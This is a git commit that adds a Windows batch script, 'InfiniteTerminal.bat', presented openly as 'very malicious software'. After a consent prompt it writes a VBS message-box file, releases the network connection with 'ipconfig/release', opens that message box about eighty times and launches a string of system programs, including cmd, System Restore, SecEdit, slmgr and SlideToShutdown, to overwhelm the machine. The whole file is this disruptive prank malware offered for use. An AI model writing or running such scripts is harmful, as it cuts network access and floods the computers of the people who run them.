696eb201a827c962eec686a1f8ece1a3dde55589
Danoni631 <danunisonsoi@gmail.com>
2026-05-23 23:03:02 -0300

    Add files via upload

---
+++ InfiniteTerminal.bat
@@ -0,0 +1,178 @@
+@echo off
+title InfiniteTerminal Alpha 0.0.1
+color 06
+cls
+
+:boot
+echo [#         ]
+timeout /t 1 >nul
+cls
+echo [#####     ]
+timeout /t 1 >nul
+cls
+echo [##########]
+timeout /t 1 >nul
+cls
+goto warning
+
+:warning
+echo WARNING!!!!!
+echo ---------------------------------
+echo This is a very malicious software
+echo that can destroy and lag your
+echo machine. You want to run?
+echo ---------------------------------
+echo 	yes = YES	no = NO
+
+set /p comand="InfiniteTerminal>"
+if /i "%comand%"=="yes" goto threads
+if /i "%comand%"=="no" goto leave
+
+:leave
+cls
+echo You don't wanted to run InfiniteTerminal...
+timeout /t 1 >nul
+exit
+
+:threads
+cls
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+echo BAD DECISION %username%
+timeout /t 1 >nul
+goto resources
+goto payloads
+
+:resources
+echo creating...
+echo x=msgbox("THE END IS NEAR", 0+48, "THE END IS NEAR") > msg.vbs
+
+:payloads
+goto nonet
+goto folders
+goto spam
+
+:nonet
+ipconfig/release
+
+:spam
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start msg.vbs
+start explorer.exe
+start notepad.exe
+start calc.exe
+start lpksetup.exe
+start lusrmsg.exe
+start PING.exe
+start rstrui.exe
+start SecEdit.exe
+start winver.exe
+start ipconfig.exe
+start label.exe
+start cmd.exe
+start charmap.exe
+start cleanmgr.exe
+start slmgr.vbs
+start wscript.exe
+start SlideToShutdown.exe
+start wmplayer.exe
+start wabmig.exe
+start wab.exe
